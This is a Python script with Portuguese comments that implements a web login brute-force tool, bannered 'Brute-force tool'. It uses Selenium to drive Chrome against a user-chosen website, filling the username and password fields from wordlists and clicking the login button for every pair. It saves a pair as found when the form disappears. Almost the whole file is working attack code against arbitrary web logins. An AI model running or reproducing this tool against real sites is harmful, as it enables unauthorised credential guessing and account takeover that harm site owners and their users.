# -*- coding: utf-8 -*-
#Versão do Python: 3.7.2
#Requisitos: biblioteca Selenium; WebDriver do Google Chrome teste

import sys
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

#Configurações

#Analisador de opções 
parser = OptionParser()

#Argumentos (gerenciados com o OptionPare)
parser.add_option("-u", "--userlist", dest="userlist",help="Coloque o diretório do Arquivo de Usuário")
parser.add_option("-p", "--passlist", dest="passlist",help="Coloque o diretório do Arquivo de Senha")
parser.add_option("-f", "--foundlist", dest="foundlist",help="Coloque o diretório do Arquivo '.txt' onde os usuários encontrados deverão ser salvos")
parser.add_option("--usernamesel", dest="usernamesel",help="Coloque o identificador do campo Usuário")
parser.add_option("--passsel", dest="passsel",help="Coloque o identificador do campo Senha")
parser.add_option("-l", "--loginsel", dest="loginsel",help= "Coloque o botão de Login")
parser.add_option("-w", "--website", dest="website",help="Escolha um site alvo")
(options, args) = parser.parse_args()


# Função onde os dados vão ser setados
def set_dados():
    print (banner)
    website = input('\n[~] Inserir Website: ')
    #Equivalente ao print
    sys.stdout.write('[!] Checando a existência do site:  '),
    #Liberar o Buffer
    sys.stdout.flush()
    t.sleep(1)

    try:
        # Fazer uma requisição ao site para verificar a existência dele
        request = requests.get(website)
        if request.status_code == 200:
            print ('[OK]')
            # Liberar o Buffer
            sys.stdout.flush()
    # Continuar o fluxo do programa caso o site não exista
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print ('[!] Saindo ..')
        exit()
    except:
        t.sleep(1)
        print ('[X]')
        t.sleep(1)
        print ('[!] O site não foi encontrado, certifique-se de ter inserido: http / https')
        exit()

    # Inserir o campo onde o nome de usuário é identificado no site
    username_selector = input('[~] Insira o username selector: ')
    # Inserir o campo onde a senha é identificada no site
    password_selector = input('[~] Insira o password selector: ')
    login_btn_selector = input('[~] Insira o selector do btn de Login: ')
    username_list = input('[~] Insira o diretório da lista de Usuários para teste: ')
    pass_list = input('[~] Insira o diretório da lista de senhas para teste: ')
    usr_encontrados = input('[~] Coloque o diretório do Arquivo ".txt" onde os usuários encontrados deverão ser salvos: ')
    # Chamar o método de Brute Force passando os parâmetros setados acima
    exec_bf(username_list, username_selector ,password_selector, login_btn_selector, pass_list, usr_encontrados, website)

# Método de Brute Force
def exec_bf(username_list, username_selector ,password_selector, login_btn_selector, pass_list, usr_encontrados, website):
    # Abrir arquivo de senhas e converter em uma lista
    with open(pass_list) as passwd:
        s = list(passwd)

    # Abrir arquivo de usuarios e converter em uma lista
    with open(username_list) as usr:
        u = list(usr)
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    #Setando as configurações acima e abrindo o Chrome
    browser = webdriver.Chrome(executable_path="chromedriver.exe" ,options=optionss)
    while True:
        try:
            #Entrar no site
            browser.get(website)
            t.sleep(2)
            for usuario in u:
                for senha in s:
                    #Finds Selector by name in tag
                    Sel_user = browser.find_element_by_xpath('//input[@name="{}"]'.format(username_selector)) 
                    Sel_pas = browser.find_element_by_xpath('//input[@name="{}"]'.format(password_selector))
                    # Uma linha é quebrada automaticamente, fazendo com que um enter seja enviado ao site
                    enter = browser.find_element_by_class_name(login_btn_selector) #Finds Selector
                    # Retirar a quebra de linha do fim de usuário e senha
                    usuario = usuario.rstrip('\n')
                    senha = senha.rstrip('\n')
                    Sel_user.send_keys(usuario)
                    Sel_pas.send_keys(senha)
                    print ('\n')
                    print ('Tentando usuário: {} com senha: {}'.format(usuario, senha))
                    print ('\n')
                    print ('[+] ------------------------')
                    enter.click()
                    t.sleep(3)
                    Sel_user = browser.find_element_by_xpath('//input[@name="{}"]'.format(username_selector)).clear()
                    Sel_pas = browser.find_element_by_xpath('//input[@name="{}"]'.format(password_selector)).clear()
                                                        
        except KeyboardInterrupt:
            print('\n')
            print ('    =========================================')
            print ('    ||       [x] PROGRAMA FINALIZADO       ||')
            print ('    =========================================')
            print('\n')
            exit()
        
        except selenium.common.exceptions.NoSuchElementException:
            print('\n')
            print('Um elemento da Página não foi encontrado !')
            print('==========================================')
            print('Possíveis motivos para isso ter ocorrido: ')
            print('[1] Você foi bloqueado por tentativas de Login excessivas')
            print('[2] O sistema obteve Êxito ao tentar Login com o usuário {} e senha {} !!!'.format(usuario, senha))
            print('\n')
            encontrado = open(usr_encontrados, 'w')
            print('Usuário: {} e Senha: {}'.format(usuario, senha), file=encontrado)
            encontrado.close()
            exit()
        
banner = '''
 ______     ______     ______     ______     __  __    
/\  ___\   /\  __ \   /\  == \   /\  __ \   /\ \/\ \   
\ \ \__ \  \ \  __ \  \ \  __<   \ \ \/\ \  \ \ \_\ \  
 \ \_____\  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_____\ 
  \/_____/   \/_/\/_/   \/_/ /_/   \/_____/   \/_____/ 

    [+] V.1.0
    [+] Improved for Jonathan
    [+] Brute-force tool                                        '''


if options.userlist == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        if options.foundlist == None:
                            set_dados()

#Pegando os dados setados no Option Parser
username = options.userlist
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
usr_encontrados = options.foundlist
print (banner)
exec_bf(username, username_selector , password_selector, login_btn_selector, pass_list, usr_encontrados, website)
# teste